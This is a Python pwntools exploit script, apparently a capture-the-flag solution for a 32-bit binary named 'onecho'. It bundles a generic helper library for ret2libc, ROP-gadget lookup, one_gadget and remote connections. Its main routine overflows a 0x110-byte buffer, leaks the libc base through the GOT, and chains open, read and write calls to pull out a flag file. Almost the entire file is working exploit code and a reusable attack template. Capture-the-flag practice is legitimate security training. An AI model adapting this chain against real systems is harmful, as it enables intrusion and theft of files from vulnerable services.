#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# -----------------------------------
# @File    :  exp.py
# @Author  :  woodwhale
# @Time    :  2021/10/10 13:51:03
# -----------------------------------

from pwn import *
from LibcSearcher import *
import sys, subprocess, warnings, os

def ret2libc(leak,func,binary=null):
    libc    = LibcSearcher(func,leak)       if binary == null else binary
    base    = leak-libc.dump(func)          if binary == null else leak-libc.sym[func]
    system  = base+libc.dump('system')      if binary == null else base+libc.sym['system']
    binsh   = base+libc.dump('str_bin_sh')  if binary == null else next(libc.search(b'/bin/sh'))
    return  (system,binsh)

def hack(pwn):
    global io,binary,libc
    times = 0
    while True:
        try:
            times += 1
            clear()
            info(f'time ================> {times}')
            pwn()
        except:
            io.close()
            io = proce(binary,libc.path) if arglen == 1 else (remote(sys.argv[1].split(':')[0],sys.argv[1].split(':')[1]) if arglen == 2 else remote(sys.argv[1],sys.argv[2]))

def init(binary):
    global arglen, elf, path , libc, context, io
    arglen = len(sys.argv)
    warnings.filterwarnings('ignore')
    context.terminal = ['gnome-terminal','-x', 'bash','-c']
    elf = ELF(binary)
    path = libcpath(binary)
    libc = ELF(path)
    libc.path = path
    context.arch = elfbit(binary)
    io = proce(binary,path) if arglen == 1 else (remote(sys.argv[1].split(':')[0],sys.argv[1].split(':')[1]) if arglen == 2 else remote(sys.argv[1],sys.argv[2]))

s           =       lambda data                       : io.send(data)
sa          =       lambda rv,data                    : io.sendafter(rv,data)
sl          =       lambda data                       : io.sendline(data)
sla         =       lambda rv,data                    : io.sendlineafter(rv,data)
r           =       lambda num                        : io.recv(num)
rl          =       lambda keepends=True              : io.recvline(keepends)
ru          =       lambda data,drop=True,time=null   : io.recvuntil(data,drop) if time == null else io.recvuntil(data,drop,time)
ia          =       lambda                            : io.interactive()
l32         =       lambda                            : u32(ru(b'\xf7')[-4:].ljust(4,b'\x00'))
l64         =       lambda                            : u64(ru(b'\x7f')[-6:].ljust(8,b'\x00'))
uu32        =       lambda data                       : u32(data.ljust(4,b'\x00'))
uu64        =       lambda data                       : u64(data.ljust(8,b'\x00'))
i16         =       lambda data                       : int(data,16)
leak        =       lambda name,addr                  : log.success('\033[33m{}\033[0m = \033[31m{:#x}\033[0m'.format(name, addr))
info        =       lambda data                       : log.info(f'\033[36m{data}\033[0m')
pau         =       lambda                            : pause() if DEBUG else null
dbg         =       lambda point=null                 : (gdb.attach(io) if point == null else gdb.attach(io,f'b *{point}')) if DEBUG else null
og          =       lambda binary                     : list(map(int,subprocess.check_output(['one_gadget','--raw','-f',binary]).decode().strip('\n').split(' ')))
rg          =       lambda binary,only,grep           : i16(subprocess.check_output([f"ROPgadget --binary {binary} --only '{only}' | grep {grep}"],shell=True).decode().split(' ')[0])
setlibc     =       lambda leak,func                  : leak - libc.sym[func]
elfbit      =       lambda binary                     : 'i386' if subprocess.check_output(['file',binary]).decode().split(' ')[2] == '32-bit' else 'amd64'
libcpath    =       lambda binary                     : subprocess.check_output(['ldd',binary]).decode().replace('	', '').split('\n')[1].split(' ')[2] if GLIBC else subprocess.check_output(['ls | grep libc*.so'],shell=True).decode().strip('\n').split('\n')[0]
proce       =       lambda binary,libc=null           : process(binary) if GLIBC else process(binary,env={'LD_PRELOAD':'./'+libc})
clear       =       lambda                            : os.system('clear')

# context.log_level='debug'
DEBUG  = 0
GLIBC  = 1
binary = './onecho'
init(binary)

def pwn():
    bss = 0x804C008
    puts_got = elf.got['puts']
    write_plt = elf.plt['write']
    myread = 0x080495C6
    pop_esi_edi_ebp = 0x08049811

    payload = flat(
        'flag\x00'.ljust(0x110 ,'b' ),
        pop_esi_edi_ebp, bss,
        0x18, 0,
        write_plt ,myread, 1,puts_got,0x4
    )
    
    dbg()
    sla("name:",payload)
    pau()
    
    puts_addr = uu32(ru(b"\xf7",False)[-4:])
    libc.address = puts_addr - libc.sym["puts"]
    leak("libc_base",libc.address)
    open_addr = libc.sym['open']
    read_addr = libc.sym['read']

    flag_addr = bss
    payload = flat(
        'flag\x00'.ljust( 0x110,'\x00'), 
        pop_esi_edi_ebp, 0,
        1, 0,
        open_addr ,myread ,flag_addr 
    )
    dbg()
    sl(payload)
    
    payload = flat(
        'flag\x00'.ljust( 0x110,'\x00'), 
        pop_esi_edi_ebp, 0,
        1, 0,
        read_addr ,myread ,3 , flag_addr , 0x30 
    )
    sl(payload)

    payload = flat(
        'flag\x00'.ljust( 0x110,'\x00'), 
        pop_esi_edi_ebp, 0,
        1, 0,
        write_plt ,myread ,1 , flag_addr , 0x30 
    )
    sl(payload)
    
    ia()

# hack(pwn)
pwn()